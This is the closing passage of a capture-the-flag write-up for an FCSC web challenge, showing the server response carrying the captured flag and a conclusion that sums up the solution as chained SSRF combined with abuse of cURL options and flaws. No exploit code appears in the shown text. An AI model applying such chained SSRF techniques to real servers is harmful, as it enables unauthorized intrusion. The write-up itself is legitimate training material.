HTTP/1.1 200 OK
date: Fri, 12 Apr 2024 14:16:24 GMT
server: Apache/2.4.58 (Unix)
x-powered-by: PHP/8.3.4
content-length: 70
content-type: text/html; charset=UTF-8
x-robots-tag: noindex, nofollow, nosnippet, noarchive, nocache, noodp, noyaca
connection: close

FCSC{d8af233176d6ca50598a48fc47d8cadeae37b3d35a641efc1ad7777c86fe28a9}
```

# Conclusion: 

This challenge is one of the hardest I've had to do in Web, the fact of having a sequence of nested ssrf and abusing options and vulnerabilities in CUrl at the same time makes full exploitation difficult.

Here's a schematic of the full exploit:  
![Exploitation diagram](https://i.imgur.com/ZtniYci.png)

Thanks to [Mizu](https://twitter.com/kevin_mizu) and [BitK](https://twitter.com/BitK_) for the challenge :)